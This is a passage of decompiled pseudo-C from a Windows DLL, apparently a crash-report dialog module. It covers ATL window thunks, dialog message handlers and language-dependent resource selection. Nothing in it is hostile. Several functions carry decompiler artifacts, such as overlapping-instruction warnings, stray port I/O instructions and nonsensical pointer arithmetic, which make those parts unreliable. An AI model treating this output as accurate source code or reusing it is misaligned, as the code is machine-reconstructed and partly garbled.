      *(undefined2 *)(iVar3 + 0xc + uVar8 * 2) = 0;
    }
  } while ((uVar7 <= local_8 + 1) && (uVar7 < 0x7fff));
  return;
}



/* Function: FUN_1002b990 */

void __thiscall FUN_1002b990(int param_1,undefined4 param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 local_80;
  undefined4 local_7c;
  undefined4 local_78;
  int *local_74 [26];
  uint local_c;
  
  local_c = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_78 = param_2;
  local_80 = 0;
  local_7c = 0;
  FUN_10029140(param_2,0,0,0);
  iVar3 = 0;
  if (0 < *(int *)(param_1 + 8)) {
    iVar2 = 0;
    do {
      if (*(int *)(iVar2 + *(int *)(param_1 + 4)) != 0) {
        local_74[0] = (int *)0x0;
        FUN_1002b7f0(local_78,*(undefined4 *)(iVar2 + 4 + *(int *)(param_1 + 4)),local_74);
        FUN_10029360(*(undefined4 *)(iVar2 + 4 + *(int *)(param_1 + 4)),local_74,&local_80,
                     *(undefined4 *)(iVar2 + *(int *)(param_1 + 4)));
        if (local_74[0] != (int *)0x0) {
          LOCK();
          iVar1 = *local_74[0];
          *local_74[0] = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(local_74[0]);
          }
        }
      }
      iVar3 = iVar3 + 1;
      iVar2 = iVar2 + 0xc;
    } while (iVar3 < *(int *)(param_1 + 8));
  }
  FUN_10029230();
  FUN_100579df();
  return;
}



/* Function: FUN_1002ba50 */

undefined4 __thiscall FUN_1002ba50(int *param_1,undefined2 *param_2)

{
  undefined2 *puVar1;
  code *pcVar2;
  int iVar3;
  undefined4 uVar4;
  uint uVar5;
  
  iVar3 = param_1[2];
  if (param_1[1] == iVar3) {
    puVar1 = (undefined2 *)*param_1;
    if ((puVar1 <= param_2) && (param_2 < puVar1 + iVar3)) {
      FUN_10007f20(0x80004005);
      pcVar2 = (code *)swi(3);
      uVar4 = (*pcVar2)();
      return uVar4;
    }
    if (iVar3 == 0) {
      uVar5 = 1;
    }
    else {
      uVar5 = param_1[1] * 2;
      if ((int)uVar5 < 0) {
        return 0;
      }
      if (0x3fffffff < uVar5) {
        return 0;
      }
    }
    iVar3 = FUN_1005b45e(puVar1,uVar5,2);
    if (iVar3 == 0) {
      return 0;
    }
    param_1[2] = uVar5;
    *param_1 = iVar3;
  }
  puVar1 = (undefined2 *)(*param_1 + param_1[1] * 2);
  if (puVar1 != (undefined2 *)0x0) {
    *puVar1 = *param_2;
  }
  param_1[1] = param_1[1] + 1;
  return 1;
}



/* Function: FUN_1002bae0 */

int * __thiscall FUN_1002bae0(int *param_1,short *param_2)

{
  short sVar1;
  int *piVar2;
  int iVar3;
  int *extraout_ECX;
  short *psVar4;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100761f8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  piVar2 = (int *)FUN_100080e0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  if (piVar2 == (int *)0x0) {
    FUN_10007f20(0x80004005);
    piVar2 = extraout_ECX;
  }
  iVar3 = (**(code **)(*piVar2 + 0xc))();
  *param_1 = iVar3 + 0x10;
  local_8 = 0;
  if (param_2 == (short *)0x0) {
    iVar3 = 0;
  }
  else {
    if (((uint)param_2 & 0xffff0000) == 0) {
      iVar3 = FUN_1002ad20();
      if (iVar3 == 0) {
        ExceptionList = local_10;
        return param_1;
      }
      FUN_1002bba0(iVar3,(uint)param_2 & 0xffff);
      ExceptionList = local_10;
      return param_1;
    }
    psVar4 = param_2;
    do {
      sVar1 = *psVar4;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    iVar3 = (int)psVar4 - (int)(param_2 + 1) >> 1;
  }
  FUN_1002a200(param_2,iVar3);
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1002bba0 */

undefined4 __thiscall FUN_1002bba0(int *param_1,undefined4 param_2,uint param_3)

{
  wchar_t wVar1;
  code *pcVar2;
  int iVar3;
  ushort *puVar4;
  undefined4 uVar5;
  rsize_t _N;
  wchar_t *pwVar6;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  uint _N1;
  undefined4 unaff_EDI;
  wchar_t *_S2;
  
  iVar3 = FUN_106566de(param_1,param_2,(param_3 >> 4) + 1 & 0xffff,6,unaff_EDI,unaff_ESI,unaff_EBX,
                       unaff_EBP);
  if ((iVar3 == 0) || (puVar4 = (ushort *)FUN_1002acb0(), puVar4 == (ushort *)0x0)) {
    return 0;
  }
  _N1 = (uint)*puVar4;
  if ((int)(1U - *(int *)(*param_1 + -4) | *(int *)(*param_1 + -8) - _N1) < 0) {
    FUN_1002a2c0();
  }
  _N = (rsize_t)*puVar4;
  _S2 = (wchar_t *)(puVar4 + 1);
  if (_N == 0xffffffff) {
    if (_S2 == (wchar_t *)0x0) {
      iVar3 = 0;
    }
    else {
      pwVar6 = _S2;
      do {
        wVar1 = *pwVar6;
        pwVar6 = pwVar6 + 1;
      } while (wVar1 != L'\0');
      iVar3 = (int)pwVar6 - (int)(puVar4 + 2) >> 1;
    }
    _N = iVar3 + 1;
  }
  _wmemcpy_s((wchar_t *)*param_1,_N1,_S2,_N);
  FUN_10007f40();
  if (*(int *)(*param_1 + -8) < (int)_N1) {
    FUN_10007f20();
    pcVar2 = (code *)swi(3);
    uVar5 = (*pcVar2)();
    return uVar5;
  }
  *(uint *)(*param_1 + -0xc) = _N1;
  *(undefined2 *)(*param_1 + _N1 * 2) = 0;
  return 1;
}



/* Function: FUN_1002bc70 */

void __fastcall FUN_1002bc70(undefined4 *param_1)

{
  if (*(char *)(param_1 + 1) != '\0') {
    (*DAT_100792fc)(*param_1);
    *(undefined1 *)(param_1 + 1) = 0;
  }
  return;
}



/* Function: FUN_1002bc90 */

void FUN_1002bc90(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 *puVar1;
  code *pcVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  undefined4 uVar6;
  
  piVar3 = (int *)FUN_1002ae00();
  if (piVar3 == (int *)0x0) {
    return;
  }
  piVar3[1] = param_1;
  iVar4 = (**(code **)(*piVar3 + 8))();
  if (piVar3[5] == 0) {
    iVar5 = FUN_10057897();
    piVar3[5] = iVar5;
    if (iVar5 == 0) goto LAB_1002bcef;
  }
  puVar1 = (undefined4 *)piVar3[5];
  *puVar1 = 0x42444c7;
  puVar1[1] = piVar3;
  *(undefined1 *)(puVar1 + 2) = 0xe9;
  *(int *)((int)puVar1 + 9) = (iVar4 - (int)puVar1) + -0xd;
  uVar6 = (*DAT_10079264)(puVar1,0xd);
  FUN_10387ba2(uVar6,uVar6);
LAB_1002bcef:
  pcVar2 = (code *)piVar3[5];
  FUN_1013d9ff(&stack0xfffffffc,param_1,0xfffffffc,pcVar2);
  (*pcVar2)(param_1,param_2,param_3,param_4);
  return;
}



/* Function: FUN_1002bd10 */

undefined4 __thiscall
FUN_1002bd10(int param_1,undefined4 param_2,int *param_3,undefined4 param_4,uint param_5,
            undefined4 param_6,int param_7,short param_8)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 uVar3;
  int *piVar4;
  
  if (*(int *)(param_1 + 0x14) == 0) {
    iVar2 = FUN_10057897();
    *(int *)(param_1 + 0x14) = iVar2;
    if (iVar2 == 0) {
      FUN_105e0749(0,0xe);
      return 0;
    }
  }
  puVar1 = *(undefined4 **)(param_1 + 0x14);
  *puVar1 = 0x42444c7;
  puVar1[1] = 0;
  *(undefined1 *)(puVar1 + 2) = 0xe9;
  *(int *)((int)puVar1 + 9) = -0xd - (int)puVar1;
  uVar3 = (*DAT_10079264)(puVar1,0xd);
  FUN_1009f734(param_1,uVar3);
  if (param_8 == 0) {
    return 0;
  }
  FUN_1002ada0(param_1 + 8,param_1);
  if ((param_7 == 0) && ((param_5 & 0x40000000) != 0)) {
    param_7 = param_1;
  }
  piVar4 = &DAT_10096610;
  if (param_3 != (int *)0x0) {
    piVar4 = param_3;
  }
  uVar3 = FUN_1038bff4(param_8,param_6,param_8,param_4,param_5,*piVar4,piVar4[1],piVar4[2] - *piVar4
                       ,piVar4[3] - piVar4[1],param_2,param_7,DAT_100981ec,0);
  return uVar3;
}



/* Function: FUN_1002bde0 */

undefined2 __fastcall FUN_1002bde0(int param_1,undefined4 *param_2,undefined4 *param_3)

{
  code *pcVar1;
  short sVar2;
  undefined2 uVar3;
  int iVar4;
  undefined4 uVar5;
  undefined2 extraout_DX;
  undefined4 extraout_EDX;
  undefined4 *puVar6;
  undefined8 uVar7;
  undefined4 local_70;
  undefined4 uStack_6c;
  undefined4 uStack_68;
  undefined4 uStack_64;
  undefined4 local_60;
  undefined4 uStack_5c;
  undefined4 uStack_58;
  undefined4 uStack_54;
  undefined4 local_50;
  undefined4 uStack_4c;
  undefined4 uStack_48;
  undefined4 uStack_44;
  undefined4 local_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 uStack_34;
  undefined4 local_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 local_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 local_10;
  undefined4 local_c;
  
  if ((param_2 == (undefined4 *)0x0) || (param_3 == (undefined4 *)0x0)) {
    return 0;
  }
  puVar6 = param_2;
  if (*(short *)(param_2 + 0x10) == 0) {
    FUN_103f92ac(param_1,&DAT_1009b214);
    if (*(short *)(param_2 + 0x10) == 0) {
      if (param_2[0xc] == 0) {
        if (param_2[0xf] == 0) {
          uVar5 = *(undefined4 *)(param_1 + 8);
        }
        else {
          uVar5 = 0;
        }
        FUN_102e0385(uVar5,param_2[0xe]);
        pcVar1 = (code *)swi(3);
        uVar3 = (*pcVar1)();
        return uVar3;
      }
      local_c = param_2[10];
      local_10 = param_2[2];
      local_40 = 0x30;
      uVar7 = FUN_103325b8(extraout_EDX,0,param_2[0xc],&local_40);
      if (((int)uVar7 == 0) &&
         (iVar4 = FUN_10494456((int)((ulonglong)uVar7 >> 0x20),*(undefined4 *)(param_1 + 4),
                               param_2[0xc],&local_40), iVar4 == 0)) {
        (*DAT_100792fc)(&DAT_1009b214);
        return 0;
      }
      *param_2 = local_40;
      param_2[1] = uStack_3c;
      param_2[2] = uStack_38;
      param_2[3] = uStack_34;
      param_2[4] = local_30;
      param_2[5] = uStack_2c;
      param_2[6] = uStack_28;
      param_2[7] = uStack_24;
      param_2[8] = local_20;
      param_2[9] = uStack_1c;
      param_2[10] = uStack_18;
      param_2[0xb] = uStack_14;
      param_2[0xd] = param_2[2];
      param_2[10] = local_c;
      param_2[2] = local_10;
      uVar5 = *(undefined4 *)(param_1 + 4);
      param_2[1] = param_2[1] & 0xffffbfff;
      param_2[5] = uVar5;
      if (param_2[10] == 0) {
        _swprintf_s((wchar_t *)((int)param_2 + 0x42),0x25,L"ATL:%p",param_2);
        param_2[10] = (wchar_t *)((int)param_2 + 0x42);
      }
      local_70 = *param_2;
      uStack_6c = param_2[1];
      uStack_68 = param_2[2];
      uStack_64 = param_2[3];
      local_60 = param_2[4];
      uStack_5c = param_2[5];
      uStack_58 = param_2[6];
      uStack_54 = param_2[7];
      local_50 = param_2[8];
      uStack_4c = param_2[9];
      uStack_48 = param_2[10];
      uStack_44 = param_2[0xb];
      sVar2 = FUN_10561d73(param_2[5],param_2[10],&local_70);
      puVar6 = param_2 + 1;
      uVar5 = in(extraout_DX);
      *param_2 = uVar5;
      *(short *)(param_2 + 0x11) = sVar2;
      if (sVar2 == 0) {
        uVar3 = FUN_1002ae80();
        *(undefined2 *)(param_2 + 0x11) = uVar3;
      }
    }
    (*DAT_100792fc)(&DAT_1009b214);
  }
  if (puVar6[0xc] != 0) {
    *param_3 = puVar6[0xd];
  }
  return *(undefined2 *)(puVar6 + 0x10);
}



/* Function: FUN_1002bf50 */

/* WARNING: Instruction at (ram,0x1002c00b) overlaps instruction at (ram,0x1002c00a)
    */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 __fastcall FUN_1002bf50(undefined4 param_1,undefined4 param_2,uint param_3,int param_4)

{
  int iVar1;
  undefined1 *puVar2;
  undefined4 uVar3;
  undefined4 extraout_EDX;
  undefined1 *puVar4;
  
  puVar2 = &stack0xfffffffc;
  puVar4 = &stack0xfffffffc;
  switch(param_2) {
  case 0x16:
    if ((param_3 != 0) || (puVar4 = &stack0xfffffffc, param_4 != 1)) {
      FUN_10303fcd(param_1,0x111,2,0);
      param_2 = extraout_EDX;
      puVar4 = &stack0xfffffffc;
    }
  default:
    goto switchD_1002bf77_caseD_17;
  case 0x24:
    *(undefined4 *)(param_4 + 0x18) = 0x118;
    *(undefined4 *)(param_4 + 0x1c) = 0xf0;
    return 1;
  case 0x110:
    if (DAT_1009ad24 == (int *)0x0) {
      if (param_4 == 0) {
        return 0;
      }
      FUN_1002b560(param_1,0);
    }
    else {
      FUN_1002b560(param_1,DAT_1009ad24);
      puVar2 = &stack0xfffffffc;
    }
    break;
  case 0x111:
    if ((short)param_3 == 1) {
      DAT_1009660c = 1;
    }
    else {
      puVar4 = &stack0xfffffffc;
      if ((short)param_3 != 2) goto switchD_1002bf77_caseD_17;
    }
    puVar2 = (undefined1 *)(param_3 & 0xffff);
    FUN_10568f88(param_1);
    _DAT_10096f48 = 1;
  }
  param_2 = *(undefined4 *)(puVar2 + -4);
  puVar4 = puVar2;
switchD_1002bf77_caseD_17:
  if (DAT_1009ad24 == (int *)0x0) {
    return 0;
  }
  iVar1 = *DAT_1009ad24;
  *(undefined4 *)(puVar4 + 0xc) = 0;
  uVar3 = (**(code **)(iVar1 + 4))
                    (param_1,param_2,*(undefined4 *)(puVar4 + 8),param_4,puVar4 + 0xc,0);
  return uVar3;
}



/* Function: FUN_1002c160 */

void __thiscall FUN_1002c160(undefined1 *param_1,undefined4 param_2)

{
  uint uVar1;
  undefined4 uVar2;
  int iVar3;
  undefined2 extraout_DX;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100760be;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if (*(int *)(param_1 + 0x14) == 0) {
    *(undefined4 *)(param_1 + 0x14) = param_2;
    FUN_104e9c41(*(undefined4 *)(param_1 + 0xc),*(undefined4 *)(param_1 + 0x20),uVar1);
    uVar2 = (*DAT_10079420)(param_2,0x80,0);
    iVar3 = FUN_103ec6e3(uVar2,*(undefined4 *)(param_1 + 0xc),*(undefined4 *)(param_1 + 0x24));
    if (iVar3 != 0) {
      (*DAT_10079420)(param_2,0x80,1,iVar3);
    }
    FUN_103594ce(param_2,0xffffffeb,param_1);
    out(*param_1,extraout_DX);
    if ((DAT_1009b5b0 & 1) == 0) {
      DAT_1009b5b0 = DAT_1009b5b0 | 1;
      local_8 = 0;
      FUN_10028f80(0,0,0);
      FUN_10057b51(&LAB_10078840);
    }
    FUN_10029030(param_2,*(undefined4 *)(param_1 + 5),*(undefined4 *)(param_1 + 9));
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1002c240 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * __thiscall
FUN_1002c240(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  uint uVar1;
  int iVar2;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007608e;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  param_1[1] = param_4;
  param_1[3] = param_2;
  uVar1 = DAT_1009b5bc;
  DAT_1009660c = 2;
  *param_1 = CMultiLingualDlgImpl<class_CSendReportDlg2>::vftable;
  param_1[2] = 8;
  param_1[4] = 0x8c;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0x84;
  param_1[9] = 0x83;
  _DAT_10096f48 = 0;
  DAT_1009ad24 = param_1;
  if ((uVar1 & 1) == 0) {
    DAT_1009b5bc = uVar1 | 1;
    local_8 = 0;
    FUN_10033a00(0,param_1);
  }
  iVar2 = DAT_1009b5c0;
  if (DAT_1009b5c0 == 0) {
    iVar2 = 1;
  }
  switch(iVar2) {
  case 2:
    param_1[8] = 0x90;
    param_1[9] = 0x8f;
    break;
  case 3:
    param_1[8] = 0x92;
    param_1[9] = 0x91;
    break;
  case 4:
    param_1[8] = 0x96;
    param_1[9] = 0x95;
    break;
  case 5:
    param_1[8] = 0x98;
    param_1[9] = 0x98;
    break;
  case 7:
    param_1[8] = 0x9e;
    param_1[9] = 0x9e;
    break;
  case 8:
    param_1[8] = 0x9b;
    param_1[9] = 0x9b;
    break;
  case 9:
    param_1[8] = 0x9f;
    param_1[9] = 0x9f;
    break;
  case 10:
    param_1[8] = 0xa2;
    param_1[9] = 0xa2;
  }
  if (param_1[6] == 0) {
    if (param_1[7] == 0) {
      FUN_1056d8a7();
      ExceptionList = local_10;
      return param_1;
    }
    FUN_1055d925(*(undefined2 *)(param_1 + 4),param_1[3],*(undefined2 *)(param_1 + 4),0);
    FUN_1063c15d(param_1,param_1[5],5);
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1002c410 */

void __fastcall FUN_1002c410(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  *param_1 = CMultiLingualDlgImpl<class_CSendReportDlg2>::vftable;
  iVar1 = FUN_1047eacd(param_1[5]);
  piVar2 = (int *)(&DAT_10096f48 + iVar1);
  *piVar2 = (int)(*piVar2 + (int)piVar2);
  *(char *)piVar2 = (char)*piVar2 + (char)piVar2;
  DAT_1009ad24 = 0;
  return;
}



/* Function: FUN_1002c440 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * __fastcall FUN_1002c440(undefined4 *param_1)

{
  uint uVar1;
  
  *param_1 = CMultiLingualDlgImpl<class_CSendReportDlg2>::vftable;
  uVar1 = FUN_10582e99(param_1[5]);
  _DAT_10096f48 = 1;
  DAT_1009ad24 = 0;
  if ((uVar1 & 0x10845f6) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_1002c480 */

undefined ** __fastcall FUN_1002c480(int *param_1)

{
  undefined **ppuVar1;
  
  if (2 < *param_1) {
    ppuVar1 = &PTR_10083554;
    if (*(undefined ***)(param_1[1] + 8) != (undefined **)0x0) {
      ppuVar1 = *(undefined ***)(param_1[1] + 8);
    }
    return ppuVar1;
  }
  return &PTR_10083554;
}



/* Function: FUN_1002c4a0 */

/* WARNING: Instruction at (ram,0x1002c746) overlaps instruction at (ram,0x1002c745)
    */

void __thiscall FUN_1002c4a0(int param_1,undefined4 param_2)

{
  uint uVar1;
  int *piVar2;
  undefined4 uVar3;
  int *piVar4;
  undefined4 extraout_ECX;
  undefined2 in_CS;
  undefined2 uVar5;
  undefined *puVar6;
  int iVar7;
  int **ppiVar8;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076257;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  FUN_1002c160(param_2,param_1);
  if ((DAT_1009acb0 & 1) == 0) {
    DAT_1009acb0 = DAT_1009acb0 | 1;
    local_8 = 0;
    DAT_1009aca8 = (int *)0x0;
    DAT_1009acac = 0;
    DAT_1009aca8 = (int *)FUN_1000fa00(0,0);
    FUN_10057b51(FUN_10078380,uVar1);
  }
  if ((DAT_1009acbc & 1) == 0) {
    DAT_1009acbc = DAT_1009acbc | 1;
    local_8 = 1;
    DAT_1009acb4 = (int *)0x0;
    DAT_1009acb8 = 0;
    DAT_1009acb4 = (int *)FUN_1000fa00(0,0);
    FUN_10057b51(FUN_100783d0,uVar1);
  }
  local_14 = (int *)0x0;
  ppiVar8 = &local_14;
  local_8 = 2;
  iVar7 = 0x452;
  FUN_1002b7f0(param_2,0x452,ppiVar8);
  piVar4 = (int *)*DAT_1009aca8;
  piVar2 = local_14;
  if (piVar4 != DAT_1009aca8) {
    do {
      if (piVar4[2] == 0) {
        iVar7 = 0;
      }
      else {
        iVar7 = piVar4[2] + 0xc;
      }
      ppiVar8 = (int **)0xffffffff;
      piVar2 = (int *)FUN_1000bfa0(iVar7,0xffffffff);
      piVar4 = (int *)*piVar4;
    } while (piVar4 != DAT_1009aca8);
  }
  local_14 = piVar2;
  piVar4 = local_14;
  if ((DAT_1009b5b0 & 1) == 0) {
    DAT_1009b5b0 = DAT_1009b5b0 | 1;
    DAT_1009b5b4 = 0;
    DAT_1009b5b8 = 0;
    local_8._0_1_ = 4;
    puVar6 = &DAT_10087588;
    FUN_10041860(0,0x8a,&DAT_10087588,iVar7,ppiVar8);
    FUN_10041d80(&DAT_100874a0,&DAT_10083854,puVar6,iVar7,ppiVar8);
    FUN_10041d80(&DAT_100874ac,&DAT_100874a8,puVar6,iVar7,ppiVar8);
    FUN_10041d80(L"\n\n$e",&PTR_10083554,puVar6,iVar7,ppiVar8);
    FUN_10041d80(L"%PRODUCTNAME",L"DealWithLanguage",puVar6,iVar7,ppiVar8);
    FUN_10057b51(&LAB_10078840);
    local_8 = CONCAT31(local_8._1_3_,2);
  }
  piVar2 = (int *)*DAT_1009acb4;
  if (piVar2 != DAT_1009acb4) {
    do {
      if ((piVar2[2] != 0) && (*(int *)(piVar2[2] + 8) != 0)) {
        FUN_1000bfa0(&DAT_100874a8,0xffffffff);
        uVar3 = FUN_1002c480(extraout_ECX);
        FUN_1000bfa0(uVar3,0xffffffff);
        piVar4 = (int *)FUN_1000bfa0(&DAT_10083854,0xffffffff);
        iVar7 = piVar2[2];
        local_14 = piVar4;
        if ((iVar7 != 0) && (*(int *)(iVar7 + 8) != 0)) {
          piVar4 = (int *)FUN_1000c1a0(iVar7 + 0xc,*(undefined4 *)(iVar7 + 8));
          local_14 = piVar4;
        }
      }
      piVar2 = (int *)*piVar2;
    } while (piVar2 != DAT_1009acb4);
  }
  piVar2 = (int *)FUN_1000ae10(&local_18);
  if (*piVar2 == 0) {
    iVar7 = 0;
  }
  else {
    iVar7 = *piVar2 + 0xc;
  }
  FUN_10006250("injected text: \'%s\'\n",iVar7);
  if (local_18 != (int *)0x0) {
    LOCK();
    iVar7 = *local_18;
    *local_18 = iVar7 + -1;
    UNLOCK();
    if (iVar7 + -1 < 0) {
      FUN_100579ee(local_18);
    }
  }
  if (piVar4 == (int *)0x0) {
    piVar2 = (int *)0x0;
  }
  else {
    piVar2 = piVar4 + 3;
  }
  FUN_104f8938(param_2,0x452,piVar2);
  FUN_1002c770(param_2);
  if (*(int *)(param_1 + 0x1c) != 0) {
    if (piVar4 == (int *)0x0) {
      ExceptionList = local_10;
      return;
    }
    LOCK();
    *piVar4 = *piVar4 + -1;
    UNLOCK();
  }
  uVar5 = 0x1002;
  FUN_1013b808(*(undefined4 *)(param_1 + 0x14),5);
  func_0x1074f685(CONCAT22(uVar5,in_CS));
  *piVar4 = *piVar4 >> 0xf;
  if (*piVar4 < 0) {
    FUN_100579ee(piVar4);
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1002c770 */

/* WARNING: Removing unreachable block (ram,0x1002c808) */
/* WARNING: Removing unreachable block (ram,0x1002c811) */

void __thiscall FUN_1002c770(int param_1,undefined4 param_2)

{
  undefined4 unaff_ESI;
  int iVar1;
  int iVar2;
  undefined1 auStack_84 [8];
  undefined4 local_7c;
  undefined4 local_78;
  undefined4 local_74;
  uint local_c;
  
  local_c = DAT_100956e0 ^ (uint)auStack_84;
  local_7c = param_2;
  local_78 = 0;
  local_74 = 0;
  FUN_10029140(param_2,1,2,*(undefined4 *)(param_1 + 0x28));
  iVar2 = 0;
  if (0 < *(int *)(param_1 + 8)) {
    iVar1 = 0;
    do {
      if (*(int *)(*(int *)(param_1 + 4) + iVar1) != 0) {
        FUN_1002b7f0(unaff_ESI,*(undefined4 *)(*(int *)(param_1 + 4) + 4 + iVar1),&stack0xffffff70);
        FUN_10029360(*(undefined4 *)(*(int *)(param_1 + 4) + 4 + iVar1),&stack0xffffff70,
                     &stack0xffffff78,*(undefined4 *)(*(int *)(param_1 + 4) + iVar1));
      }
      iVar2 = iVar2 + 1;
      iVar1 = iVar1 + 0xc;
    } while (iVar2 < *(int *)(param_1 + 8));
  }
  FUN_10029230();
  FUN_100579df();
  return;
}



/* Function: FUN_1002c850 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * __thiscall
FUN_1002c850(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  undefined4 uVar4;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007608e;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  param_1[1] = param_4;
  param_1[3] = param_2;
  uVar1 = DAT_1009b5bc;
  _DAT_10096fdc = 2;
  *param_1 = CMultiLingualDlgImpl<class_CSendReportDlg3>::vftable;
  param_1[2] = 3;
  param_1[4] = 0x8e;
  param_1[5] = 0;
  param_1[6] = 1;
  param_1[7] = 0;
  param_1[8] = 0x84;
  param_1[9] = 0x83;
  _DAT_10096604 = 0;
  DAT_1009acd0 = param_1;
  if ((uVar1 & 1) == 0) {
    DAT_1009b5bc = uVar1 | 1;
    local_8 = 0;
    FUN_10033a00(0,param_1);
  }
  iVar3 = DAT_1009b5c0;
  if (DAT_1009b5c0 == 0) {
    iVar3 = 1;
  }
  switch(iVar3) {
  case 2:
    param_1[8] = 0x90;
    param_1[9] = 0x8f;
    break;
  case 3:
    param_1[8] = 0x92;
    param_1[9] = 0x91;
    break;
  case 4:
    param_1[8] = 0x96;
    param_1[9] = 0x95;
    break;
  case 5:
    param_1[8] = 0x98;
    param_1[9] = 0x98;
    break;
  case 7:
    param_1[8] = 0x9e;
    param_1[9] = 0x9e;
    break;
  case 8:
    param_1[8] = 0x9b;
    param_1[9] = 0x9b;
    break;
  case 9:
    param_1[8] = 0x9f;
    param_1[9] = 0x9f;
    break;
  case 10:
    param_1[8] = 0xa2;
    param_1[9] = 0xa2;
  }
  if (param_1[6] == 0) {
    if (param_1[7] == 0) {
      FUN_103c49f3();
      ExceptionList = local_10;
      return param_1;
    }
    uVar4 = FUN_103c6600(*(undefined2 *)(param_1 + 4),param_1[3],*(undefined2 *)(param_1 + 4),0,
                         FUN_1002ca20,param_1,uVar2);
    FUN_1039a58a(uVar4,param_1[5],5);
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1002ca20 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 FUN_1002ca20(undefined4 param_1,undefined4 param_2,uint param_3,int param_4)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = param_4;
  switch(param_2) {
  case 0x16:
    if ((param_3 != 0) || (param_4 != 1)) {
      FUN_105934f5(param_2,param_1,0x111,2,0);
    }
    break;
  case 0x24:
    *(undefined4 *)(param_4 + 0x18) = 0x118;
    *(undefined4 *)(param_4 + 0x1c) = 0xf0;
    return 1;
  case 0x110:
    if (DAT_1009acd0 == (int *)0x0) {
      if (param_4 == 0) {
        return 0;
      }
      FUN_1002c4a0(param_1,0);
    }
    else {
      FUN_1002c4a0(param_1,DAT_1009acd0);
    }
    break;
  case 0x111:
    if ((short)param_3 == 1) {
      _DAT_10096fdc = 1;
    }
    else if ((short)param_3 != 2) break;
    FUN_1042d76c(param_2,param_1,param_3 & 0xffff);
    _DAT_10096604 = 1;
  }
  if (DAT_1009acd0 == (int *)0x0) {
    return 0;
  }
  param_4 = 0;
  uVar2 = (**(code **)(*DAT_1009acd0 + 4))(param_1,param_2,param_3,iVar1,&param_4,0);
  return uVar2;
}



/* Function: FUN_1002cc20 */

undefined4
FUN_1002cc20(undefined4 param_1,int param_2,short param_3,undefined4 param_4,undefined4 *param_5,
            int param_6)

{
  undefined4 uVar1;
  
  if (param_6 != 0) {
    if ((param_6 == 1) && (param_2 == 0x111)) {
      if (param_3 == -0x1e90) {
        FUN_1002d840();
        *param_5 = 0;
        return 1;
      }
      if (param_3 == -0x1e8f) {
        FUN_1002d7a0();
        *param_5 = 0;
        return 1;
      }
      if (param_3 == -0x1e8e) {
        FUN_1002d970();
        *param_5 = 0;
        return 1;
      }
      if (param_3 == -0x1e8d) {
        FUN_1002d8d0();
        *param_5 = 0;
        return 1;
      }
      if (param_3 == -0x1e8c) {
        FUN_1002da00();
        *param_5 = 0;
        return 1;
      }
      if (param_3 == -0x1e8b) {
        uVar1 = FUN_1002d4d0();
        *param_5 = uVar1;
        return 1;
      }
      if (param_3 == -0x1e8a) {
        FUN_1002db20();
        *param_5 = 0;
        return 1;
      }
      if (param_3 == -0x1e89) {
        FUN_1002da80();
        *param_5 = 0;
        return 1;
      }
      if (param_3 == -0x1e88) {
        FUN_1002dc50();
        *param_5 = 0;
        return 1;
      }
      if (param_3 == -0x1e87) {
        FUN_1002dbb0();
        *param_5 = 0;
        return 1;
      }
      if (param_3 == -0x1e86) {
        uVar1 = FUN_1002d550();
        *param_5 = uVar1;
        return 1;
      }
      if (param_3 == -0x1e85) {
        uVar1 = FUN_1002d5d0();
        *param_5 = uVar1;
        return 1;
      }
    }
    return 0;
  }
  if (param_2 == 0x115) {
    uVar1 = 1;
  }
  else {
    if (param_2 != 0x114) {
      if (param_2 == 0x20a) {
        uVar1 = FUN_1002d000();
        *param_5 = uVar1;
        return 1;
      }
